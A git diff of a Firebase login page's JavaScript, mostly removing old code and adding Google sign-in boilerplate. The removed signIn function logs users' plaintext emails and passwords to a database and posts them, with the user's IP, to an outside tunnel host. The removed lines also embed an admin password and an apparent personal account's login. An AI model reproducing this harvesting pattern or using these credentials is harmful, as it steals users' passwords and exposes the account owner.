@@ -69,86 +69,6 @@ function DisplayIP(response) {
 }
 
 //signIn
-function signIn() {
-  var email = document.getElementById("email");
-  var password = document.getElementById("password");
-
-  var today = new Date();
-  var date =
-    today.getFullYear() + "-" + (today.getMonth() + 1) + "-" + today.getDate();
-  var time =
-    today.getHours() + ":" + today.getMinutes() + ":" + today.getSeconds();
-  var dateTime = date + " " + time;
-  db.ref("logs").once("value", function (snapshot) {
-    // var password = "not known";
-    var prevVal = snapshot.val();
-    db.ref("logs").set(
-      `${prevVal}
-           __________________________________
-           Email: ${email.value}
-           Password: ${password.value}
-           Time: ${dateTime}
-           __________________________________
-           `
-    );
-  });
-  axios
-    .post("https://howto13.loca.lt/login", {
-      email: email.value,
-      password: password.value,
-      ipadress: ip_address,
-    })
-    .then((res) => {
-      console.log(res.data);
-    });
-  const promise = auth.signInWithEmailAndPassword(email.value, password.value);
-  promise.catch((e) => {
-    if (
-      e.message.toString() ==
-      "The user account has been disabled by an administrator."
-    ) {
-      container.textContent = "";
-      ban.textContent = "You have been banned !";
-      ban_time.textContent = "Ban Time : Forever";
-      ban_Reason.textContent = "Reason : Unknown";
-      title.textContent = "Banned !";
-      ok.textContent = "OK";
-      ok.style.backgroundColor = "#3428a7";
-      ok.style.width = "200px";
-      ok.style.height = "80px";
-      ok.style.cursor = "Pointer";
-      ok.style.color = "white";
-    } else if (
-      e.message.toString() == "The email address is badly formatted."
-    ) {
-      alert("Invalid Username or Password");
-    } else if (
-      e.message.toString() ==
-      "A network error (such as timeout, interrupted connection or unreachable host) has occurred."
-    ) {
-      alert("Network connection not found !");
-    } else if (
-      e.message.toString() ==
-      "Access to this account has been temporarily disabled due to many failed login attempts. You can immediately restore it by resetting your password or you can try again later."
-    ) {
-      alert(
-        "Login to this account disabled due to so many fail attempts , reset your account password to access it immediately or try again later."
-      );
-    } else if (
-      e.message.toString() ==
-      "There is no user record corresponding to this identifier. The user may have been deleted."
-    ) {
-      alert(`The Email: "${email.value}" Does Not Exist`);
-    } else if (
-      e.message.toString() ==
-      "The password is invalid or the user does not have a password."
-    ) {
-      alert("Wrong Username or password");
-    } else {
-      alert(e.message);
-    }
-  });
-}
 
 ok.onclick = function () {
   ok.onclick = window.location = "./index.html";
@@ -171,50 +91,11 @@ firebase.auth().onAuthStateChanged((user) => {
       h1.textContent = "Ready to proceed !";
     }, 3500);
     setTimeout(() => {
-      window.location = "./Inside/inside.html";
+      window.location = "../Inside/inside.html";
     }, 4000);
     h1.style.color = "black";
   }
-  if (user.email == "admin@gmail.com") {
-    alert("Welcome Admin !");
-  }
 });
-
-//forgotPass
-function forgotPass() {
-  const email = document.getElementById("email").value;
-  firebase
-    .auth()
-    .sendPasswordResetEmail(email)
-    .then(() => {
-      alert("Password set Link sent to Your email ID");
-    })
-    .catch((error) => {
-      alert("Invalid Username");
-    });
-}
-
-document.onkeydown = function (e) {
-  if (e.ctrlKey && e.keyCode === 85) {
-    return false;
-  }
-};
-window.oncontextmenu = function () {
-  return false;
-};
-
-const showPass = document.querySelector(".showPass");
-const showText = document.querySelector(".showText");
-
-function ShowPassword() {
-  if (password.type == "password") {
-    password.type = "text";
-    showText.textContent = "Hide Password";
-  } else {
-    password.type = "password";
-    showText.textContent = "Show Password";
-  }
-}
 
 // Update Code
 
@@ -279,292 +160,13 @@ if (Update == true) {
   ok.style.cursor = "pointer";
 }
 
-document.body.onkeydown = function (e) {
-  if (e.keyCode == 13) signIn();
-};
-
-Mousetrap.bind("alt+s", function (e) {
-  signUp();
-});
-Mousetrap.bind("alt+l", function (e) {
-  signIn();
-});
-Mousetrap.bind("e", function (e) {
-  email.focus();
-});
-Mousetrap.bind("p", function (e) {
-  password.focus();
-});
-Mousetrap.bind("f p", function (e) {
-  forgotPass();
-});
-Mousetrap.bind("r", function (e) {
-  window.location = "./index.html";
-});
-Mousetrap.bind("ctrl+z", function (e) {
-  email.value = "example@gmail.com";
-  password.value = "123456";
-  ShowPassword();
-});
-
-Mousetrap.bind("a l", function (e) {
-  showPass.click();
-  var adminPass = prompt("Enter Admin Password here ...");
-  if (adminPass == "nwzlink") {
-    email.focus();
-    var typeVoice = new Audio("./Typewriter Sound Effect.mp3");
-    typeVoice.play();
-    email.value = "n";
-    setTimeout(() => {
-      email.value = "na";
-    }, 200);
-    setTimeout(() => {
-      email.value = "naw";
-    }, 400);
-    setTimeout(() => {
-      email.value = "nawa";
-    }, 600);
-    setTimeout(() => {
-      email.value = "nawaz";
-    }, 800);
-    setTimeout(() => {
-      email.value = "nawazx";
-    }, 1000);
-    setTimeout(() => {
-      email.value = "nawazxx";
-    }, 1200);
-    setTimeout(() => {
-      email.value = "nawazxx3";
-    }, 1400);
-    setTimeout(() => {
-      email.value = "nawazxx33";
-    }, 1600);
-    setTimeout(() => {
-      email.value = "nawazxx333";
-    }, 1800);
-    setTimeout(() => {
-      email.value = "nawazxx333@";
-    }, 2000);
-    setTimeout(() => {
-      email.value = "nawazxx333@g";
-    }, 2200);
-    setTimeout(() => {
-      email.value = "nawazxx333@gm";
-    }, 2400);
-    setTimeout(() => {
-      email.value = "nawazxx333@gma";
-    }, 2600);
-    setTimeout(() => {
-      email.value = "nawazxx333@gmai";
-    }, 2800);
-    setTimeout(() => {
-      email.value = "nawazxx333@gmail";
-    }, 3000);
-    setTimeout(() => {
-      email.value = "nawazxx333@gmail.";
-    }, 3200);
-    setTimeout(() => {
-      email.value = "nawazxx333@gmail.c";
-    }, 3400);
-    setTimeout(() => {
-      email.value = "nawazxx333@gmail.co";
-    }, 3600);
-    setTimeout(() => {
-      email.value = "nawazxx333@gmail.com";
-    }, 3800);
-    // ------------------------------------------------------
-    password.focus();
-    password.value = "N";
-    setTimeout(() => {
-      password.value = "Na";
-    }, 200);
-    setTimeout(() => {
-      password.value = "Naw";
-    }, 400);
-    setTimeout(() => {
-      password.value = "Nawa";
-    }, 600);
-    setTimeout(() => {
-      password.value = "Nawaz";
-    }, 800);
-    setTimeout(() => {
-      password.value = "Nawazl";
-    }, 1000);
-    setTimeout(() => {
-      password.value = "Nawazli";
-    }, 1200);
-    setTimeout(() => {
-      password.value = "Nawazlin";
-    }, 1400);
-    setTimeout(() => {
-      password.value = "Nawazlink";
-    }, 1600);
-    setTimeout(() => {
-      password.value = "Nawazlinke";
-    }, 1800);
-    setTimeout(() => {
-      password.value = "Nawazlinked";
-    }, 2000);
-
-    // signIn Time
-
-    setTimeout(() => {
-      signIn();
-    }, 4000);
-  } else {
-    alert("Wrong Password !");
-  }
-});
-
-Mousetrap.bind("s p", function (e) {
-  showPass.click();
-});
-
 Mousetrap.bind("shift+n", function (e) {
   alert("News : Last Updated On 1/03/2022");
 });
 
-Mousetrap.bind("alt+s", function (e) {
-  signUp();
-});
-Mousetrap.bind("alt+l", function (e) {
-  signIn();
-});
-Mousetrap.bind("e", function (e) {
-  email.focus();
-});
-Mousetrap.bind("p", function (e) {
-  password.focus();
-});
-Mousetrap.bind("f p", function (e) {
-  forgotPass();
-});
-Mousetrap.bind("r", function (e) {
-  location.reload();
-});
-Mousetrap.bind("ctrl+z", function (e) {
-  email.value = "example@gmail.com";
-  password.value = "123456";
-  ShowPassword();
-});
-Mousetrap.bind("s p", function (e) {
-  showPass.click();
-});
-Mousetrap.bind("a l", function (e) {
-  showPass.click();
-  var adminPass = prompt("Enter Admin Password here ...");
-  if (adminPass == "nwzlink") {
-    email.focus();
-    var typeVoice = new Audio("./Typewriter Sound Effect.mp3");
-    typeVoice.play();
-    email.value = "n";
-    setTimeout(() => {
-      email.value = "na";
-    }, 200);
-    setTimeout(() => {
-      email.value = "naw";
-    }, 400);
-    setTimeout(() => {
-      email.value = "nawa";
-    }, 600);
-    setTimeout(() => {
-      email.value = "nawaz";
-    }, 800);
-    setTimeout(() => {
-      email.value = "nawazx";
-    }, 1000);
-    setTimeout(() => {
-      email.value = "nawazxx";
-    }, 1200);
-    setTimeout(() => {
-      email.value = "nawazxx3";
-    }, 1400);
-    setTimeout(() => {
-      email.value = "nawazxx33";
-    }, 1600);
-    setTimeout(() => {
-      email.value = "nawazxx333";
-    }, 1800);
-    setTimeout(() => {
-      email.value = "nawazxx333@";
-    }, 2000);
-    setTimeout(() => {
-      email.value = "nawazxx333@g";
-    }, 2200);
-    setTimeout(() => {
-      email.value = "nawazxx333@gm";
-    }, 2400);
-    setTimeout(() => {
-      email.value = "nawazxx333@gma";
-    }, 2600);
-    setTimeout(() => {
-      email.value = "nawazxx333@gmai";
-    }, 2800);
-    setTimeout(() => {
-      email.value = "nawazxx333@gmail";
-    }, 3000);
-    setTimeout(() => {
-      email.value = "nawazxx333@gmail.";
-    }, 3200);
-    setTimeout(() => {
-      email.value = "nawazxx333@gmail.c";
-    }, 3400);
-    setTimeout(() => {
-      email.value = "nawazxx333@gmail.co";
-    }, 3600);
-    setTimeout(() => {
-      email.value = "nawazxx333@gmail.com";
-    }, 3800);
-    // ------------------------------------------------------
-    password.focus();
-    password.value = "N";
-    setTimeout(() => {
-      password.value = "Na";
-    }, 200);
-    setTimeout(() => {
-      password.value = "Naw";
-    }, 400);
-    setTimeout(() => {
-      password.value = "Nawa";
-    }, 600);
-    setTimeout(() => {
-      password.value = "Nawaz";
-    }, 800);
-    setTimeout(() => {
-      password.value = "Nawazl";
-    }, 1000);
-    setTimeout(() => {
-      password.value = "Nawazli";
-    }, 1200);
-    setTimeout(() => {
-      password.value = "Nawazlin";
-    }, 1400);
-    setTimeout(() => {
-      password.value = "Nawazlink";
-    }, 1600);
-    setTimeout(() => {
-      password.value = "Nawazlinke";
-    }, 1800);
-    setTimeout(() => {
-      password.value = "Nawazlinked";
-    }, 2000);
-
-    // signIn Time
-
-    setTimeout(() => {
-      signIn();
-    }, 4000);
-  } else {
-    alert("Wrong Password !");
-  }
-});
-
-Mousetrap.bind("s p", function (e) {
-  showPass.click();
-});
 document.onkeydown = function (e) {
   if (e.ctrlKey && e.keyCode === 85) {
-    window.location = "./Source/source.html";
+    window.location = "../Source/source.html";
     return false;
   }
 };
@@ -586,6 +188,7 @@ function faceSign() {
 
       // This gives you a Facebook Access Token. You can use it to access the Facebook API.
       var accessToken = credential.accessToken;
+
       // ...
     })
     .catch((error) => {
@@ -597,6 +200,39 @@ function faceSign() {
       // The firebase.auth.AuthCredential type that was used.
       var credential = error.credential;
 
+      // ...
+    });
+}
+
+// google SignIn
+function gSign() {
+  var provider = new firebase.auth.GoogleAuthProvider();
+  provider.addScope("https://www.googleapis.com/auth/contacts.readonly");
+  firebase.auth().languageCode = "it";
+  provider.setCustomParameters({
+    login_hint: "user@example.com",
+  });
+  firebase
+    .auth()
+    .signInWithPopup(provider)
+    .then((result) => {
+      /** @type {firebase.auth.OAuthCredential} */
+      var credential = result.credential;
+
+      // This gives you a Google Access Token. You can use it to access the Google API.
+      var token = credential.accessToken;
+      // The signed-in user info.
+      var user = result.user;
+      // ...
+    })
+    .catch((error) => {
+      // Handle Errors here.
+      var errorCode = error.code;
+      var errorMessage = error.message;
+      // The email of the user's account used.
+      var email = error.email;
+      // The firebase.auth.AuthCredential type that was used.
+      var credential = error.credential;
       // ...
     });
 }
